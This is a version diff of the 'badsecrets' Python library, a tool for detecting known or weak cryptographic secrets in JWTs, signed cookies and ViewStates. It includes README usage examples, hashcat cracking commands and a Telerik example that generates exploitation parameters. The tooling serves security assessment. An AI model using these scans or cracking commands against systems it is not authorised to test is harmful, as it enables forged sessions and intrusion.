# Comparing `tmp/badsecrets-0.2.311.tar.gz` & `tmp/badsecrets-0.3.347.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "badsecrets-0.2.311.tar", max compression
+gzip compressed data, was "badsecrets-0.3.347.tar", max compression
```

## Comparing `badsecrets-0.2.311.tar` & `badsecrets-0.3.347.tar`

### file list

```diff
@@ -1,42 +1,42 @@
--rw-r--r--   0        0        0    35149 2023-04-12 03:22:02.947149 badsecrets-0.2.311/LICENSE
--rw-r--r--   0        0        0    26959 2023-04-12 03:22:02.947149 badsecrets-0.2.311/README.md
--rw-r--r--   0        0        0      711 2023-04-12 03:22:02.947149 badsecrets-0.2.311/badsecrets/__init__.py
--rw-r--r--   0        0        0     4485 2023-04-12 03:22:02.947149 badsecrets-0.2.311/badsecrets/base.py
--rw-r--r--   0        0        0      233 2023-04-12 03:22:02.947149 badsecrets-0.2.311/badsecrets/errors.py
--rw-r--r--   0        0        0        0 2023-04-12 03:22:02.947149 badsecrets-0.2.311/badsecrets/examples/__init__.py
--rwxr-xr-x   0        0        0     4220 2023-04-12 03:22:02.947149 badsecrets-0.2.311/badsecrets/examples/blacklist3r.py
--rwxr-xr-x   0        0        0     3560 2023-04-12 03:22:02.947149 badsecrets-0.2.311/badsecrets/examples/cli.py
--rwxr-xr-x   0        0        0     3541 2023-04-12 03:22:02.947149 badsecrets-0.2.311/badsecrets/examples/symfony_knownkey.py
--rwxr-xr-x   0        0        0    10597 2023-04-12 03:22:02.947149 badsecrets-0.2.311/badsecrets/examples/telerik_knownkey.py
--rw-r--r--   0        0        0     3570 2023-04-12 03:22:02.947149 badsecrets-0.2.311/badsecrets/helpers.py
--rw-r--r--   0        0        0        0 2023-04-12 03:22:02.947149 badsecrets-0.2.311/badsecrets/modules/__init__.py
--rw-r--r--   0        0        0     5865 2023-04-12 03:22:02.947149 badsecrets-0.2.311/badsecrets/modules/aspnet_viewstate.py
--rw-r--r--   0        0        0     1032 2023-04-12 03:22:02.947149 badsecrets-0.2.311/badsecrets/modules/django_signedcookies.py
--rw-r--r--   0        0        0     2079 2023-04-12 03:22:02.951150 badsecrets-0.2.311/badsecrets/modules/express_signedcookies.py
--rw-r--r--   0        0        0      856 2023-04-12 03:22:02.951150 badsecrets-0.2.311/badsecrets/modules/flask_signedcookies.py
--rw-r--r--   0        0        0     3363 2023-04-12 03:22:02.951150 badsecrets-0.2.311/badsecrets/modules/generic_jwt.py
--rw-r--r--   0        0        0    13573 2023-04-12 03:22:02.951150 badsecrets-0.2.311/badsecrets/modules/jsf_viewstate.py
--rw-r--r--   0        0        0     2169 2023-04-12 03:22:02.951150 badsecrets-0.2.311/badsecrets/modules/laravel_signedcookies.py
--rw-r--r--   0        0        0     1325 2023-04-12 03:22:02.951150 badsecrets-0.2.311/badsecrets/modules/peoplesoft_pstoken.py
--rw-r--r--   0        0        0     3058 2023-04-12 03:22:02.951150 badsecrets-0.2.311/badsecrets/modules/rails_secretkeybase.py
--rw-r--r--   0        0        0     2098 2023-04-12 03:22:02.951150 badsecrets-0.2.311/badsecrets/modules/symfony_signedurl.py
--rw-r--r--   0        0        0     4943 2023-04-12 03:22:02.951150 badsecrets-0.2.311/badsecrets/modules/telerik_encryptionkey.py
--rw-r--r--   0        0        0     2961 2023-04-12 03:22:02.951150 badsecrets-0.2.311/badsecrets/modules/telerik_hashkey.py
--rw-r--r--   0        0        0   654111 2023-04-12 03:22:02.955150 badsecrets-0.2.311/badsecrets/resources/aspnet_machinekeys.txt
--rw-r--r--   0        0        0    31178 2023-04-12 03:22:02.955150 badsecrets-0.2.311/badsecrets/resources/django_secret_keys.txt
--rw-r--r--   0        0        0    40993 2023-04-12 03:22:02.955150 badsecrets-0.2.311/badsecrets/resources/express_session_secrets.txt
--rw-r--r--   0        0        0  1777603 2023-04-12 03:22:02.975150 badsecrets-0.2.311/badsecrets/resources/flask_secret_keys.txt
--rw-r--r--   0        0        0       87 2023-04-12 03:22:02.975150 badsecrets-0.2.311/badsecrets/resources/jsf_viewstate_passwords.txt
--rw-r--r--   0        0        0     1257 2023-04-12 03:22:02.975150 badsecrets-0.2.311/badsecrets/resources/jsf_viewstate_passwords_b64.txt
--rw-r--r--   0        0        0     7785 2023-04-12 03:22:02.975150 badsecrets-0.2.311/badsecrets/resources/jwt_rsakeys_private.txt
--rw-r--r--   0        0        0     2122 2023-04-12 03:22:02.975150 badsecrets-0.2.311/badsecrets/resources/jwt_rsakeys_public.txt
--rw-r--r--   0        0        0   113170 2023-04-12 03:22:02.975150 badsecrets-0.2.311/badsecrets/resources/jwt_secrets.txt
--rw-r--r--   0        0        0    45086 2023-04-12 03:22:02.975150 badsecrets-0.2.311/badsecrets/resources/laravel_app_keys.txt
--rw-r--r--   0        0        0       78 2023-04-12 03:22:02.975150 badsecrets-0.2.311/badsecrets/resources/peoplesoft_passwords.txt
--rw-r--r--   0        0        0     6184 2023-04-12 03:22:02.975150 badsecrets-0.2.311/badsecrets/resources/rails_secret_key_base.txt
--rw-r--r--   0        0        0     3009 2023-04-12 03:22:02.975150 badsecrets-0.2.311/badsecrets/resources/symfony_appsecret.txt
--rw-r--r--   0        0        0    18037 2023-04-12 03:22:02.975150 badsecrets-0.2.311/badsecrets/resources/telerik_encryption_keys.txt
--rw-r--r--   0        0        0    17990 2023-04-12 03:22:02.975150 badsecrets-0.2.311/badsecrets/resources/telerik_hash_keys.txt
--rw-r--r--   0        0        0    76516 2023-04-12 03:22:02.975150 badsecrets-0.2.311/badsecrets/resources/top_10000_passwords.txt
--rw-r--r--   0        0        0      938 2023-04-12 03:22:20.923581 badsecrets-0.2.311/pyproject.toml
--rw-r--r--   0        0        0    27772 1970-01-01 00:00:00.000000 badsecrets-0.2.311/PKG-INFO
+-rw-r--r--   0        0        0    35149 2023-06-21 19:37:04.008632 badsecrets-0.3.347/LICENSE
+-rw-r--r--   0        0        0    31849 2023-06-21 19:37:04.008632 badsecrets-0.3.347/README.md
+-rw-r--r--   0        0        0      711 2023-06-21 19:37:04.012632 badsecrets-0.3.347/badsecrets/__init__.py
+-rw-r--r--   0        0        0     6741 2023-06-21 19:37:04.012632 badsecrets-0.3.347/badsecrets/base.py
+-rw-r--r--   0        0        0      233 2023-06-21 19:37:04.012632 badsecrets-0.3.347/badsecrets/errors.py
+-rw-r--r--   0        0        0        0 2023-06-21 19:37:04.012632 badsecrets-0.3.347/badsecrets/examples/__init__.py
+-rwxr-xr-x   0        0        0     4220 2023-06-21 19:37:04.012632 badsecrets-0.3.347/badsecrets/examples/blacklist3r.py
+-rwxr-xr-x   0        0        0     7803 2023-06-21 19:37:04.012632 badsecrets-0.3.347/badsecrets/examples/cli.py
+-rwxr-xr-x   0        0        0     3544 2023-06-21 19:37:04.012632 badsecrets-0.3.347/badsecrets/examples/symfony_knownkey.py
+-rwxr-xr-x   0        0        0    10597 2023-06-21 19:37:04.012632 badsecrets-0.3.347/badsecrets/examples/telerik_knownkey.py
+-rw-r--r--   0        0        0     3570 2023-06-21 19:37:04.012632 badsecrets-0.3.347/badsecrets/helpers.py
+-rw-r--r--   0        0        0        0 2023-06-21 19:37:04.012632 badsecrets-0.3.347/badsecrets/modules/__init__.py
+-rw-r--r--   0        0        0     5868 2023-06-21 19:37:04.012632 badsecrets-0.3.347/badsecrets/modules/aspnet_viewstate.py
+-rw-r--r--   0        0        0      986 2023-06-21 19:37:04.012632 badsecrets-0.3.347/badsecrets/modules/django_signedcookies.py
+-rw-r--r--   0        0        0     2022 2023-06-21 19:37:04.012632 badsecrets-0.3.347/badsecrets/modules/express_signedcookies.py
+-rw-r--r--   0        0        0     1057 2023-06-21 19:37:04.012632 badsecrets-0.3.347/badsecrets/modules/flask_signedcookies.py
+-rw-r--r--   0        0        0     4057 2023-06-21 19:37:04.012632 badsecrets-0.3.347/badsecrets/modules/generic_jwt.py
+-rw-r--r--   0        0        0    14819 2023-06-21 19:37:04.012632 badsecrets-0.3.347/badsecrets/modules/jsf_viewstate.py
+-rw-r--r--   0        0        0     2172 2023-06-21 19:37:04.012632 badsecrets-0.3.347/badsecrets/modules/laravel_signedcookies.py
+-rw-r--r--   0        0        0     1931 2023-06-21 19:37:04.012632 badsecrets-0.3.347/badsecrets/modules/peoplesoft_pstoken.py
+-rw-r--r--   0        0        0     3061 2023-06-21 19:37:04.012632 badsecrets-0.3.347/badsecrets/modules/rails_secretkeybase.py
+-rw-r--r--   0        0        0     2932 2023-06-21 19:37:04.012632 badsecrets-0.3.347/badsecrets/modules/symfony_signedurl.py
+-rw-r--r--   0        0        0     4949 2023-06-21 19:37:04.012632 badsecrets-0.3.347/badsecrets/modules/telerik_encryptionkey.py
+-rw-r--r--   0        0        0     3718 2023-06-21 19:37:04.012632 badsecrets-0.3.347/badsecrets/modules/telerik_hashkey.py
+-rw-r--r--   0        0        0   654111 2023-06-21 19:37:04.020632 badsecrets-0.3.347/badsecrets/resources/aspnet_machinekeys.txt
+-rw-r--r--   0        0        0    31178 2023-06-21 19:37:04.020632 badsecrets-0.3.347/badsecrets/resources/django_secret_keys.txt
+-rw-r--r--   0        0        0    40993 2023-06-21 19:37:04.020632 badsecrets-0.3.347/badsecrets/resources/express_session_secrets.txt
+-rw-r--r--   0        0        0  1777603 2023-06-21 19:37:04.036632 badsecrets-0.3.347/badsecrets/resources/flask_secret_keys.txt
+-rw-r--r--   0        0        0       87 2023-06-21 19:37:04.036632 badsecrets-0.3.347/badsecrets/resources/jsf_viewstate_passwords.txt
+-rw-r--r--   0        0        0     1257 2023-06-21 19:37:04.036632 badsecrets-0.3.347/badsecrets/resources/jsf_viewstate_passwords_b64.txt
+-rw-r--r--   0        0        0     7785 2023-06-21 19:37:04.036632 badsecrets-0.3.347/badsecrets/resources/jwt_rsakeys_private.txt
+-rw-r--r--   0        0        0     2122 2023-06-21 19:37:04.036632 badsecrets-0.3.347/badsecrets/resources/jwt_rsakeys_public.txt
+-rw-r--r--   0        0        0   113170 2023-06-21 19:37:04.040632 badsecrets-0.3.347/badsecrets/resources/jwt_secrets.txt
+-rw-r--r--   0        0        0    45086 2023-06-21 19:37:04.040632 badsecrets-0.3.347/badsecrets/resources/laravel_app_keys.txt
+-rw-r--r--   0        0        0       78 2023-06-21 19:37:04.040632 badsecrets-0.3.347/badsecrets/resources/peoplesoft_passwords.txt
+-rw-r--r--   0        0        0     6184 2023-06-21 19:37:04.040632 badsecrets-0.3.347/badsecrets/resources/rails_secret_key_base.txt
+-rw-r--r--   0        0        0     3009 2023-06-21 19:37:04.040632 badsecrets-0.3.347/badsecrets/resources/symfony_appsecret.txt
+-rw-r--r--   0        0        0    18037 2023-06-21 19:37:04.040632 badsecrets-0.3.347/badsecrets/resources/telerik_encryption_keys.txt
+-rw-r--r--   0        0        0    17990 2023-06-21 19:37:04.040632 badsecrets-0.3.347/badsecrets/resources/telerik_hash_keys.txt
+-rw-r--r--   0        0        0    76516 2023-06-21 19:37:04.040632 badsecrets-0.3.347/badsecrets/resources/top_10000_passwords.txt
+-rw-r--r--   0        0        0      957 2023-06-21 19:37:25.460652 badsecrets-0.3.347/pyproject.toml
+-rw-r--r--   0        0        0    32703 1970-01-01 00:00:00.000000 badsecrets-0.3.347/PKG-INFO
```

### Comparing `badsecrets-0.2.311/LICENSE` & `badsecrets-0.3.347/LICENSE`

 * *Files identical despite different names*

### Comparing `badsecrets-0.2.311/README.md` & `badsecrets-0.3.347/README.md`

 * *Files 15% similar despite different names*

```diff
@@ -34,22 +34,34 @@
 
 ## Installation
 
 We have a [pypi](https://pypi.org/project/badsecrets/) package, so you can just do `pip install badsecrets` to make use of the library.
 
 ## Simple Usage
 
-The absolute easiest way to use Badsecrets is by simply running `badsecrets` after doing a pip install:
+The best way to use Badsecrets is by simply running `badsecrets` after doing a pip install:
 
 ```
 pip install badsecrets
 badsecrets eyJhbGciOiJIUzI1NiJ9.eyJJc3N1ZXIiOiJJc3N1ZXIiLCJVc2VybmFtZSI6IkJhZFNlY3JldHMiLCJleHAiOjE1OTMxMzM0ODMsImlhdCI6MTQ2NjkwMzA4M30.ovqRikAo_0kKJ0GVrAwQlezymxrLGjcEiW_s3UJMMCo
 ```
 
-This is doing the same thing as the `cli.py` example shown below.
+Under the hood, it's using the  `cli.py` example. The CLI can also be accessed manually without a pip installation:
+
+
+#### Without pip installation:
+```bash
+git clone https://github.com/blacklanternsecurity/badsecrets.git
+cd badsecrets
+python ./badsecrets/examples/cli.py eyJhbGciOiJIUzI1NiJ9.eyJJc3N1ZXIiOiJJc3N1ZXIiLCJVc2VybmFtZSI6IkJhZFNlY3JldHMiLCJleHAiOjE1OTMxMzM0ODMsImlhdCI6MTQ2NjkwMzA4M30.ovqRikAo_0kKJ0GVrAwQlezymxrLGjcEiW_s3UJMMCo
+```
+
+
+
+
 
 ## Examples
 
 To use the examples, after doing the pip install just `git clone` the repo and `cd` into the `badsecrets` directory:
 
 ```
 git clone https://github.com/blacklanternsecurity/badsecrets.git
@@ -59,55 +71,149 @@
 The commands in the example section below assume you are in this directory.
 
 If you are using the Badsecrets [BBOT](https://github.com/blacklanternsecurity/bbot) module, you don't need to do anything else - BBOT will install the package for you.
 
 
 ### cli.py
 
-Bad secrets includes an [example CLI](https://github.com/blacklanternsecurity/badsecrets/blob/dev/examples/cli.py) for convenience when manually checking secrets. It also has a URL mode, which will connect to a target and attempt to carve for cryptographic products and check any it finds against all modules. 
+Bad secrets includes an [example CLI](https://github.com/blacklanternsecurity/badsecrets/blob/dev/examples/cli.py) for convenience when manually checking secrets. As mentioned above, it is also accessible by just executing `badsecrets`, after a successful pip install.
+
+#### Usage
+
+```
+usage: badsecrets [-h] [-nc] [-u URL] [-nh] [-c CUSTOM_SECRETS] [-p PROXY] [-a USER_AGENT] [product ...]
+
+Check cryptographic products against badsecrets library
+
+positional arguments:
+  product               Cryptographic product to check for known secrets
+
+options:
+  -h, --help            show this help message and exit
+  -nc, --no-color       Disable color message in the console
+  -u URL, --url URL     Use URL Mode. Specified the URL of the page to access and attempt to check for secrets
+  -nh, --no-hashcat     Skip the check for compatable hashcat commands when secret isn't found
+  -c CUSTOM_SECRETS, --custom-secrets CUSTOM_SECRETS
+                        include a custom secrets file to load along with the default secrets
+  -p PROXY, --proxy PROXY
+                        In URL mode, Optionally specify an HTTP proxy
+  -a USER_AGENT, --user-agent USER_AGENT
+                        In URL mode, Optionally set a custom user-agent
+
+```
 
 * Basic usage - checking a crytographic product for a known secret (against all modules):
+
 ```bash
-python ./badsecrets/examples/cli.py eyJhbGciOiJIUzI1NiJ9.eyJJc3N1ZXIiOiJJc3N1ZXIiLCJVc2VybmFtZSI6IkJhZFNlY3JldHMiLCJleHAiOjE1OTMxMzM0ODMsImlhdCI6MTQ2NjkwMzA4M30.ovqRikAo_0kKJ0GVrAwQlezymxrLGjcEiW_s3UJMMCo
+badsecrets eyJhbGciOiJIUzI1NiJ9.eyJJc3N1ZXIiOiJJc3N1ZXIiLCJVc2VybmFtZSI6IkJhZFNlY3JldHMiLCJleHAiOjE1OTMxMzM0ODMsImlhdCI6MTQ2NjkwMzA4M30.ovqRikAo_0kKJ0GVrAwQlezymxrLGjcEiW_s3UJMMCo
 ```
+It has a URL mode, which will connect to a target and attempt to carve for cryptographic products and check any it finds against all modules. 
 
-* URL Mode - Connecting to a target and carving for a cryptographic product, and if found checking it for known secrets (against all modules):
+* URL Mode
 
 ```bash
-python ./badsecrets/examples/cli.py --url http://example.com/contains_bad_secret.html
+badsecrets --url http://example.com/contains_bad_secret.html
 ```
 
 You can also set a custom user-agent with `--user-agent "user-agent string"` or a proxy with `--proxy http://127.0.0.1` in this mode.
 
 Example output:
 
 ```bash
-$ python ./badsecrets/examples/cli.py eyJhbGciOiJIUzI1NiJ9.eyJJc3N1ZXIiOiJJc3N1ZXIiLCJVc2VybmFtZSI6IkJhZFNlY3JldHMiLCJleHAiOjE1OTMxMzM0ODMsImlhdCI6MTQ2NjkwMzA4M30.ovqRikAo_0kKJ0GVrAwQlezymxrLGjcEiW_s3UJMMCo
-badsecrets - example command line interface
+$ badsecrets eyJhbGciOiJIUzI1NiJ9.eyJJc3N1ZXIiOiJJc3N1ZXIiLCJVc2VybmFtZSI6IkJhZFNlY3JldHMiLCJleHAiOjE1OTMxMzM0ODMsImlhdCI6MTQ2NjkwMzA4M30.ovqRikAo_0kKJ0GVrAwQlezymxrLGjcEiW_s3UJMMCo
+
+ __ )              |                                |         
+ __ \    _` |   _` |   __|   _ \   __|   __|   _ \  __|   __| 
+ |   |  (   |  (   | \__ \   __/  (     |      __/  |   \__ \ 
+____/  \__,_| \__,_| ____/ \___| \___| _|    \___| \__| ____/ 
+
+v0.3.337
 
-***********************
 Known Secret Found!
 
 Detecting Module: Generic_JWT
 
+Product Type: JSON Web Token (JWT)
+Product: eyJhbGciOiJIUzI1NiJ9.eyJJc3N1ZXIiOiJJc3N1ZXIiLCJVc2VybmFtZSI6IkJhZFNlY3JldHMiLCJleHAiOjE1OTMxMzM0ODMsImlhdCI6MTQ2NjkwMzA4M30.ovqRikAo_0kKJ0GVrAwQlezymxrLGjcEiW_s3UJMMCo
+Secret Type: HMAC/RSA Key
+Location: manual
 Secret: 1234
 Details: {'Issuer': 'Issuer', 'Username': 'BadSecrets', 'exp': 1593133483, 'iat': 1466903083, 'jwt_headers': {'alg': 'HS256'}}
-***********************
+```
+
+* Hashcat
+
+By default, when a secret is NOT found, the provided product will be checked for potential hashcat matches. If there is a match, a nearly complete hashcat command will be produced (potentially) suitable for cracking the product via hashcat. This can let you get those keys that may not be known, but are weak and still crackable. Not all modules are capable of producing hashcat output. This behavior can be disabled with the `--no-hashcat` option.
+
+```
+badsecrets eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.qvkcSLMQPAQdEuRFv0h3aQIRpTfaI57GjXLOWI_6NaE
+```
+
+Example output:
+
+```
+ __ )              |                                |         
+ __ \    _` |   _` |   __|   _ \   __|   __|   _ \  __|   __| 
+ |   |  (   |  (   | \__ \   __/  (     |      __/  |   \__ \ 
+____/  \__,_| \__,_| ____/ \___| \___| _|    \___| \__| ____/ 
+
+v0.3.337
+
+No secrets found :(
+
+Potential matching hashcat commands:
+
+Module: [Flask_SignedCookies] Flask Signed Cookie Command: [hashcat -m 29100 -a 0 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.qvkcSLMQPAQdEuRFv0h3aQIRpTfaI57GjXLOWI_6NaE <dictionary_file>]
+Module: [Generic_JWT] JSON Web Token (JWT) Algorithm: HS256 Command: [hashcat -m 16500 -a 0 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.qvkcSLMQPAQdEuRFv0h3aQIRpTfaI57GjXLOWI_6NaE  <dictionary_file>]
+```
+* Custom Secret Lists
+
+It is possible to specify a file containing additional secrets. These will be added to the default lists when the check is performed. This is accomplished with the `-c` / `--custom-secrets` flag. The provided value must be a valid file. There is a 100k size limit on the provided file.
+
+```
+badsecrets eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.vKxsE0u-TrpoMQ5zmBv1_I-NXSgouq6iZJWMHbHSmgY -c test.txt
+```
+
+Example output:
+
+```
+ __ )              |                                |         
+ __ \    _` |   _` |   __|   _ \   __|   __|   _ \  __|   __| 
+ |   |  (   |  (   | \__ \   __/  (     |      __/  |   \__ \ 
+____/  \__,_| \__,_| ____/ \___| \___| _|    \___| \__| ____/ 
+
+v0.3.337
+
+Including custom secrets list [test.txt]
+
+Known Secret Found!
+
+Detecting Module: Generic_JWT
+
+Product Type: JSON Web Token (JWT)
+Product: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.vKxsE0u-TrpoMQ5zmBv1_I-NXSgouq6iZJWMHbHSmgY
+Secret Type: HMAC/RSA Key
+Location: manual
+Secret: fake123
+Details: {'sub': '1234567890', 'name': 'John Doe', 'iat': 1516239022, 'jwt_headers': {'alg': 'HS256', 'typ': 'JWT'}}
 ```
 
 ### Blacklist3r.py
 
+*Note: This is now obsolete, since `cli.py` is now capable of handling machinekeys/generator values. It will remain included for reference.*
+*Example: `badsecrets KLox5XeGYfb7Lo8zFzr1YepUagXuixcxX55lpFht+rrW6VGheZi831vdusH6DCMfxIhsLG1EPU3OuPvqN2XBc/fj0ew15TQ1zBmmKWJVns4= AAAAAAAA`*
+
 Bad secrets includes a [fully functional CLI example](https://github.com/blacklanternsecurity/badsecrets/blob/dev/badsecrets/examples/blacklist3r.py) which replicates the functionality of [blacklist3r](https://github.com/NotSoSecure/Blacklist3r) in python badsecrets/examples/blacklist3r. 
 
+
 ```bash
 python ./badsecrets/examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
 python ./badsecrets/examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
 ```
 
-
 ### Telerik_knownkey.py
 
 Fully functional CLI example for identifying known Telerik Hash keys and Encryption keys for Post-2017 versions (those patched for CVE-2017-9248), and brute-forcing version / generating exploitation DialogParameters values.
 
 ```bash
 python ./badsecrets/examples/telerik_knownkey.py --url http://vulnerablesite/Telerik.Web.UI.DialogHandler.aspx
 ```
@@ -341,13 +447,13 @@
 
 ### Contributions
 
 Nothing would make us happier than getting a pull request with a new module! But the easiest way to contribute would be helping to populate our word lists! If you find publicly available keys help us make Badsecrets more useful by submitting a pull request to add them.
 
 Requests for modules are always very welcome as well!
 
-### Planned Modules
+### Planned Modules and Future Development
 
 - ~~Laravel~~
 -  ~~Express~~
-
+- Research into network devices with default keys that are detectable via a cryptographic product (For example, Palo Alto Global Protect default masterkeys)
```

### Comparing `badsecrets-0.2.311/badsecrets/__init__.py` & `badsecrets-0.3.347/badsecrets/__init__.py`

 * *Files identical despite different names*

### Comparing `badsecrets-0.2.311/badsecrets/base.py` & `badsecrets-0.3.347/badsecrets/base.py`

 * *Files 25% similar despite different names*

```diff
@@ -8,31 +8,31 @@
 generic_base64_regex = re.compile(
     r"^(?:[A-Za-z0-9+\/]{4}){8,}(?:[A-Za-z0-9+\/]{4}|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{2}={2})$"
 )
 
 
 class BadsecretsBase:
     identify_regex = re.compile(r".+")
-    description = {"Product": "Undefined", "Secret": "Undefined"}
+    description = {"product": "Undefined", "secret": "Undefined"}
 
     hash_sizes = {"SHA1": 20, "MD5": 16, "SHA256": 32, "SHA384": 48, "SHA512": 64}
     hash_algs = {
         "SHA1": hashlib.sha1,
         "MD5": hashlib.md5,
         "SHA256": hashlib.sha256,
         "SHA384": hashlib.sha384,
         "SHA512": hashlib.sha512,
         "AES": hashlib.sha1,
         "3DES": hashlib.sha1,
     }
 
     check_secret_args = 1
 
-    def __init__(self, **kwargs):
-        setattr(self, "custom_resource", kwargs.get("custom_resource", None))
+    def __init__(self, custom_resource=None, **kwargs):
+        self.custom_resource = custom_resource
 
         if self.custom_resource:
             if not os.path.exists(self.custom_resource):
                 raise badsecrets.errors.LoadResourceException(
                     f"Custom resource [{self.custom_resource}] does not exist"
                 )
 
@@ -40,95 +40,145 @@
     def check_secret(self, secret):
         raise NotImplementedError
 
     @classmethod
     def get_description(self):
         return self.description
 
-    def load_resource(self, resource):
+    def get_hashcat_commands(self, s):
+        return None
+
+    def load_resources(self, resource_list):
+        filepaths = []
         if self.custom_resource:
-            filepath = self.custom_resource
-        else:
-            filepath = f"{os.path.dirname(os.path.abspath(__file__))}/resources/{resource}"
-        with open(filepath) as r:
-            for l in r.readlines():
-                if len(l) > 0:
-                    yield l
+            filepaths.append(self.custom_resource)
+        for r in resource_list:
+            filepaths.append(f"{os.path.dirname(os.path.abspath(__file__))}/resources/{r}")
+        for filepath in filepaths:
+            with open(filepath) as r:
+                for l in r.readlines():
+                    if len(l) > 0:
+                        yield l
 
     def carve_to_check_secret(self, s):
         if s.groups():
             r = self.check_secret(s.groups()[0])
             return r
 
     @abstractmethod
     def carve_regex(self):
         return None
 
-    def carve(self, body=None, cookies=None, requests_response=None):
+    def carve(self, body=None, cookies=None, headers=None, requests_response=None):
         results = []
 
-        if not body and not cookies and requests_response == None:
-            raise badsecrets.errors.CarveException("Either body/cookies or requests_response required")
+        if not body and not cookies and not headers and requests_response == None:
+            raise badsecrets.errors.CarveException("Either body/headers/cookies or requests_response required")
 
         if requests_response != None:
-            if body or cookies:
-                raise badsecrets.errors.CarveException("Body/cookies and requests_response cannot both be set")
+            if body or cookies or headers:
+                raise badsecrets.errors.CarveException("Body/cookies/headers and requests_response cannot both be set")
 
             if type(requests_response) == requests.models.Response:
                 body = requests_response.text
                 cookies = dict(requests_response.cookies)
+                headers = requests_response.headers
             else:
                 raise badsecrets.errors.CarveException("requests_response must be a requests.models.Response object")
 
         if cookies:
             if type(cookies) != dict:
                 raise badsecrets.errors.CarveException("Header argument must be type dict")
             for k, v in cookies.items():
                 r = self.check_secret(v)
                 if r:
                     r["type"] = "SecretFound"
-                    r["source"] = v
+                    r["product"] = v
+                    r["location"] = "cookies"
+                    results.append(r)
+
+        if headers:
+            for header_value in headers.values():
+                r = self.check_secret(header_value)
+                if r:
+                    r["type"] = "SecretFound"
+                    r["product"] = header_value
+                    r["location"] = "headers"
                     results.append(r)
+                elif self.carve_regex():
+                    s = re.search(self.carve_regex(), header_value)
+                    if s:
+                        r = {"type": "IdentifyOnly"}
+                        r["hashcat"] = self.get_hashcat_commands(s.groups()[0])
+                        r["product"] = s.groups()[0]
+                        r["location"] = "headers"
+                        results.append(r)
+
         if body:
             if type(body) != str:
                 raise badsecrets.errors.CarveException("Body argument must be type str")
             if self.carve_regex():
                 s = re.search(self.carve_regex(), body)
                 if s:
                     r = self.carve_to_check_secret(s)
                     if r:
                         r["type"] = "SecretFound"
                     else:
                         r = {"type": "IdentifyOnly"}
-                    r["source"] = s.groups()[0]
+                        r["hashcat"] = self.get_hashcat_commands(s.groups()[0])
+                    r["product"] = s.groups()[0]
+                    r["location"] = "body"
                     results.append(r)
 
         for r in results:
             r["description"] = self.get_description()
-        return results
+
+        # Don't report an IdentifyOnly result if we have a SecretFound result for the same 'product'
+        secret_found_results = set(d["product"] for d in results if d["type"] == "SecretFound")
+        return [d for d in results if not (d["type"] == "IdentifyOnly" and d["product"] in secret_found_results)]
 
     @classmethod
-    def identify(self, secret):
-        if re.match(self.identify_regex, secret):
+    def identify(self, product):
+        if re.match(self.identify_regex, product):
             return True
         return False
 
     @staticmethod
     def search_dict(d, query):
         items = [key for key, value in d.items() if query == value]
         if items:
             return items
 
 
-def check_all_modules(*args):
+def hashcat_all_modules(product):
+    hashcat_candidates = []
     for m in BadsecretsBase.__subclasses__():
         x = m()
+        if x.identify(product):
+            hashcat_commands = x.get_hashcat_commands(product)
+            if hashcat_commands:
+                for hcc in hashcat_commands:
+                    z = {
+                        "detecting_module": m.__name__,
+                        "hashcat_command": hcc["command"],
+                        "hashcat_description": hcc["description"],
+                    }
+                    hashcat_candidates.append(z)
+    return hashcat_candidates
+
+
+def check_all_modules(*args, **kwargs):
+    for m in BadsecretsBase.__subclasses__():
+        x = m(custom_resource=kwargs.get("custom_resource", None))
         r = x.check_secret(*args[0 : x.check_secret_args])
         if r:
             r["detecting_module"] = m.__name__
+            r["description"] = x.get_description()
+            r["product"] = args[0]
+            r["location"] = "manual"
             return r
     return None
 
 
 def carve_all_modules(**kwargs):
     results = []
     for m in BadsecretsBase.__subclasses__():
```

### Comparing `badsecrets-0.2.311/badsecrets/examples/blacklist3r.py` & `badsecrets-0.3.347/badsecrets/examples/blacklist3r.py`

 * *Files identical despite different names*

### Comparing `badsecrets-0.2.311/badsecrets/examples/cli.py` & `badsecrets-0.3.347/badsecrets/examples/symfony_knownkey.py`

 * *Files 27% similar despite different names*

```diff
@@ -1,43 +1,29 @@
 #!/usr/bin/env python3
-# badsecrets - example command line interface
+# badsecrets - Symfony _fragment known secret key brute-force tool
 # Black Lantern Security - https://www.blacklanternsecurity.com
 # @paulmmueller
 
-from badsecrets.base import check_all_modules, carve_all_modules
-import requests
-import argparse
-import sys
-import os
 import re
+import os
+import sys
+import hashlib
+import argparse
+import requests
+from contextlib import suppress
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-from urllib3.exceptions import InsecureRequestWarning
-
-# Suppress only the single warning from urllib3 needed.
-requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 sys.path.append(os.path.dirname(SCRIPT_DIR))
 
+from badsecrets import modules_loaded
 
-def report_finding(x):
-    print("***********************")
-    print("Known Secret Found!\n")
-    print(f"Detecting Module: {x['detecting_module']}\n")
-    print(f"Secret: {x['secret']}")
-    if x["details"] != None:
-        print(f"Details: {x['details']}")
-
-
-def report_identify(x):
-    print("***********************")
-    print("Cryptographic Product Identified (no vulnerability)\n")
-    print(f"Detecting Module: {x['detecting_module']}\n")
-    print(f"Product: {x['description']['Product']}")
